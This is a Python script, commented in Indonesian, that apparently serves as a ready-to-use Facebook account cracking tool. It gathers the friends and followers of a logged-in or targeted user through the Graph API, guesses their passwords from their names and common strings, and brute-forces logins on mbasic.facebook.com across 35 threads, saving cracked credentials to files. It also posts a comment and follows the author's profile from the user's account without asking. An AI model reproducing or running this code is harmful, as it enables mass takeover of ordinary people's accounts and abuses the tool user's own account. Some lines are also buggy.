#hargain author :) jangan diganti ya!
#Boleh ubah headers, pw list dan lain" tapi mohon jangan ubah author asli hhe ane buatnya 1 mingguan semoga di mengerti :)

#libary / module import
import requests as req,json,os,time,re,pyfiglet
from concurrent.futures import ThreadPoolExecutor as Bool
from bs4 import BeautifulSoup as parser
#ua="Mozilla/5.0 (Linux; Android 5.1.1; walleye/Bulid/LMY48G;wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36"
try:ua=req.get("https://api-asutoolkit.cloudaccess.host/useragent.txt").text.strip() #api buat get headers java me :)
except req.exceptions.ConnectionError:exit("[!] Kesalahan Pada Koneksi")
#variable buat data :)
ok,cp,cot=0,0,0
idTeman,idPublik,idFol=[],[],[]
anunya=""
#nama nama buat logo :)
try:
	judul=pyfiglet.figlet_format('CRACK')
	tem=pyfiglet.figlet_format('TEMAN')
	pub=pyfiglet.figlet_format('PUBLIC')
	logi=pyfiglet.figlet_format('LOGIN')
	follow=pyfiglet.figlet_format('FOLLOWER')
except:os.system('pip install pyfiglet')
#function login
def login():
	os.system('clear')
	print(f'{logi}\n[   LOGIN FIRST GENKS   ]\n\n[1]. Log in with the access token\n[2]. Login with cookies\n[99]. Exit Tool :)\n')
	p=input('[?] Pilih yang mana : ')
	if p in ('01','1'): #condition 1 login with token :)
		print('\n[!] Please enter your access token [!]\n')
		try:
			t=input('[?] Access token you : ')
			r=json.loads(req.get(f'https://graph.facebook.com/me?access_token={t}').text)
			print('[√] Login successful [√]\nWith the name Facebook :',r['name'])
			open('log.txt','a').write(t)
			req.post(f'https://graph.facebook.com/136921208435288/comments/?message=Hallo saya pengguna script mu hihi&access_token={t}')
			time.sleep(2)
			nampung(t).menu()
		except KeyError:
			os.system('clear')
			print('[×] Access token Facebook Wrong [×]')
			time.sleep(2)
			login()
	elif p in ('02','2'): #condition 2 logged in with cookies
		print('\n[!] PLEASE ENTER YOUR COOKIE [!]\n')
		cookie=input("[!] Enter your Fb Cookie : ")
		tomken=req.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
		find_token = re.search('(EAAA\w+)',tomken.text)
		if (find_token is None):
			print("[!] Cookie Facebook was wrong")
			time.sleep(2)
			login()
		else:
			to=find_token.group(1)
			ru=json.loads(req.get(f"https://graph.facebook.com/me?access_token={to}").text)
			try:print("[√] Login It works\nAccount name :",ru['name'])
			except:exit("[!] Your account is subject to a waiting limit of 1 - 4 hours or use another account [!]\n")
			req.post(f"https://graph.facebook.com/136921208435288/comments/?message=Hello, I am your script user hihi&access_token={to}")
			time.sleep(2)
			open("log.txt","a").write(to)
			nampung(to).menu()
			try:
				cek=req.get("https://mbasic.facebook.com/100063522272055",cookies={"cookie":cookie}).text
				true=False
				if "Berhenti mengikuti" not in cek:true=True
				if true==True:
					req.get("https://mbasic.facebook.com/"+parser(cek,"html.parser").find("a",string="Ikuti").get("href"),cookies={"cookie":cookie})
				else:pass
			except:pass
			nampung(to).menu()
	elif p=='99':exit(':( Thanks For Using!')#the condition exits the script
	else:
		print('[!] Choice does not exist [!]\n')
		time.sleep(2)
		login()
def logic():
	try:
		t=open('log.txt','r').read()
		r=json.loads(req.get(f'https://graph.facebook.com/me?access_token={t}').text)
		os.system('clear')
		print('[√] You are already logged in to Tools [√]\nFacebook account name :',r['name'])
		time.sleep(2)
		nampung(t).menu()
	except KeyError:
		os.system('clear')
		print('[×] Token Invalid [×]')
		os.system('rm -rf log.txt')
		time.sleep(2)
		login()
	except FileNotFoundError:
		os.system('clear')
		print('[!] You are not logged into Tools [!]')
		time.sleep(2)
		login()
class crack:
	
	def __init__(self,token):self.token=token
	def crack1(self,user,pw,ttl):
		global ok,cp,cot,anunya
		if anunya!=user:
			anunya=user
			cot+=1
		data={}
		ses=req.Session()
		ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
		a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text,"html.parser")
		b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for c in a("input"):
			try:
				if c.get("name") in b:data.update({c.get("name"):c.get("value")})
				else:continue
			except:pass
		data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
		if "c_user" in d.cookies:
			ok+=1
			open("ok.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
			print(f"\r\x1b[1;32m[OK] {user} | {pw} | {ttl}\n         \x1b[0m",end="")
		elif "checkpoint" in d.cookies:
			cp+=1
			open("cp.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
			print(f"\r\x1b[1;33m[CP] {user} | {pw} | {ttl}\n     \x1b[0m",end="")
		print(f'\r[=] CRACK:-{str(cot)}/{len(idTeman)} OK:-{str(ok)} CP:-{str(cp)}',end='')
	def crack2(self,user,pw,ttl):
		global ok,cp,cot,anunya
		if anunya!=user:
			anunya=user
			cot+=1
		data={}
		ses=req.Session()
		ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
		a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text,"html.parser")
		b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for c in a("input"):
			try:
				if c.get("name") in b:data.update({c.get("name"):c.get("value")})
				else:continue
			except:pass
		data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
		if "c_user" in d.cookies:
			ok+=1
			open("ok.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
			print(f"\r\x1b[1;32m[OK] {user} | {pw} | {ttl}\n        \x1b[0m",end="")
		elif "checkpoint" in d.cookies:
			cp+=1
			open("cp.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
			print(f"\r\x1b[1;33m[CP] {user} | {pw} | {ttl}\n    \x1b[0m",end="")
		print(f'\r[=] CRACK:-{str(cot)}/{len(idPublik)} OK:-{str(ok)} CP:-{str(cp)}',end='')
	def crack3(self,user,pw,ttl):
		global ok,cp,cot,anunya
		if anunya!=user:
			anunya=user
			cot+=1
		data={}
		ses=req.Session()
		ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
		a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text,"html.parser")
		b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for c in a("input"):
			try:
				if c.get("name") in b:data.update({c.get("name"):c.get("value")})
				else:continue
			except:pass
		data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
		if "c_user" in d.cookies:
			ok+=1
			open("ok.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
			print(f"\r\x1b[1;32m[OK] {user} | {pw} | {ttl}\n         \x1b[0m",end="")
		elif "checkpoint" in d.cookies:
			cp+=1
			open("cp.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
			print(f"\r\x1b[1;33m[CP] {user} | {pw} | {ttl}\n     \x1b[0m",end="")
		print(f'\r[=] CRACK:-{str(cot)}/{len(idFol)} OK:-{str(ok)} CP:-{str(cp)}',end='')
class nampung:
	
	def __init__(self,token):self.token=token
	def sendTeman(self):
		os.system('clear')
		print(f'{tem}\n[   Crack Friends List   ]\n')
		with Bool(max_workers=35) as tokai:
			r=json.loads(req.get(f'https://graph.facebook.com/me/friends?access_token={self.token}').text)
			for i in r['data']:idTeman.append(i['id'])
			print('[+] Ok save : ok.txt\n[+] Cp save : cp.txt\n')
			time.sleep(1)
			print('[+] Number of friend IDs :',len(idTeman),'\n[+] Starting crack, stop? CTRL + Z\n======================================\n')
			for id in idTeman:
				r2=json.loads(req.get(f'https://graph.facebook.com/{id}?access_token={self.token}').text)
				try:ttl=r2['birthday']
				except:ttl="Diprivate"
				pwList=[r2['first_name'],r2['first_name']+'123',r2['first_name']+'12345',['last_name']+'123','Pakistan','Lahore','Khan123','Ali123','1234567','786786','000786','Love123','Swabi123','Swat123']
				try:
					for pw in pwList:tokai.submit(crack(self.token).crack1,id,pw,ttl)
				except:pass
		print(f'\n[   Crack done | the results get OK:-{str(ok)} CP:-{str(cp)}   ]\n')
		b=input('[ ENTER TO BACK ]')
		self.menu()
	def sendPublik(self):
		os.system('clear')
		print(f'{pub}\n[   Crack Friends List   ]\n')
		t=input('[!] Enter Friend / Person ID : ')
		try:
			r=json.loads(req.get(f'https://graph.facebook.com/{t}?access_token={self.token}').text)
			print('\n[+] Ok save : ok.txt\n[+] Cp save : cp.txt\n\n[+] Nama target/orang :',r['name'])
		except:
			print('[×] User not found [×]')
			time.sleep(2)
			self.menu()
		r3=json.loads(req.get(f'https://graph.facebook.com/{t}/friends?access_token={self.token}').text)
		with Bool(max_workers=35) as tokai:
			for i in r3['data']:idPublik.append(i['id'])
			print('[+] Jumlah ID teman :',len(idPublik),'\n\n[+] Starting crack, stop? CTRL + Z\n======================================\n')
			for id in idPublik:
				r2=json.loads(req.get(f'https://graph.facebook.com/{id}?access_token={self.token}').text)
				try:ttl=r2['birthday']
				except:ttl="Diprivate"
				pwList=[r2['first_name'],r2['first_name']+'123',r2['first_name']+'12345',['last_name']+'123','Pakistan','Lahore','Khan123','Ali123','1234567','786786','000786','Love123','Swabi123','Swat123']
				try:
					for pw in pwList:tokai.submit(crack(self.token).crack2,id,pw,ttl)
				except:pass
		print(f'[   Crack Done | the results get OK:-{str(ok)} CP:-{str(cp)}   ]\n')
		b=input('[ ENTER TO BACK ]')
		self.menu()
	def sendFollow(self):
		os.system('clear')
		os.system('clear')
		print(f'{follow}\n[   CRACK FROM FOLLOWER   ]\n')
		print('[1]. Your Fb followers\n[2]. Followers Fb Public\n')
		p=input('[?] Choose which one : ')
		if p in ('01','1'):
			with Bool(max_workers=35) as tokai:
				r=json.loads(req.get(f'https://graph.facebook.com/me/subscribers?limit=5000&access_token={self.token}').text)
				for id6 in r['data']:idFol.append(id6['id'])
				print('\n[+] Number of followers:',len(idFol),'\n[+] Starting crack, stop? ctrl + z\n======================================\n')
				for me in idFol:
					ks=json.loads(req.get(f'https://graph.facebook.com/{me}?access_token={self.token}').text)
					id1=ks['id']
					try:ttl=ks['birthday']
					except:ttl="Diprivate"
					pwList1=[ks['first_name'],ks['first_name']+'123',ks['first_name']+'12345',ks['last_name']+'123','Pakistan','Lahore','Khan123','Ali123','1234567','786786','000786','Love123','Swabi123','Swat123']
					try:
						for pw in pwList1:tokai.submit(crack(self.token).crack3,id1,pw,ttl)
					except:pass
			bc=input("[COMPLETE CRACK ENTER TO BACK]")
			self.menu()
		elif p in ('02','2'):
			tr=input('\n[+] Enter the target id : ')
			try:
				r2=json.loads(req.get(f'https://graph.facebook.com/{tr}?access_token={self.token}').text)
				print('\n[+] Target name:',r2['name'])
			except KeyError:
				print('[×] User not found [×]')
				time.sleep(2)
				self.menu()
			with Bool(max_workers=35) as tokai2:
				r3=json.loads(req.get(f'https://graph.facebook.com/{tr}/subscribers?limit=5000&access_token={self.token}').text)
				for id10 in r3['data']:idFol.append(id10['id'])
				print('[+] Number of followers:',len(idFol),'\n[+] Starting crack, stop? ctrl + z\n======================================\n')
				for me2 in idFol:
					ks2=json.loads(req.get(f'https://graph.facebook.com/{me2}?access_token={self.token}').text)
					id2=ks2['id']
					try:ttl2=ks2['birthday']
					except:ttl2="Diprivate"
					pwList2=[ks2['first_name'],ks2['first_name']+'123',ks2['first_name']+'12345',ks2['last_name']+'123','Pakistan','Lahore','Khan123','Ali123','1234567','786786','000786','Love123','Swabi123','Swat123']
					try:
						for pw2 in pwList2:tokai2.submit(crack(self.token).crack3,id2,pw2,ttl2)
					except:pass
			bc=input("[COMPLETE CRACK ENTER TO BACK]")
			self.menu()
		else:
			print('[!] Choice None!')
			self.sendFollow()
	def menu(self):
		os.system('clear')
		os.system('clear')
		r=json.loads(req.get(f'https://graph.facebook.com/me?access_token={self.token}').text)
		print(f'{judul}\n[ Hallo',r['name']+', Welcome ]\n\n[+] Author\t: Sayyed Zakarya\n[+] WhatsApp\t: 03472860857\n[+] Facebook\t: Sayyed Zakarya Bacha\n[+] Team\t: Mr-Robot\n-----------------------------------\n\n[1]. Crack your fb friends list\n[2]. Crack friends list / public id\n[3]. Crack from followers\n[9]. Logout \n')
		while True:
			p=input('[?] Select which one : ')
			if p in ('01','1'):self.sendTeman()
			elif p in ('02','2'):self.sendPublic()
			elif p in ('03','3'):self.sendFollow()
			elif p=='9':
				os.system('rm -rf log.txt')
				exit('[√] Logout successful [√]')
			else:print('[!] Choice does not exist\n')

if __name__=='__main__':
	logic()
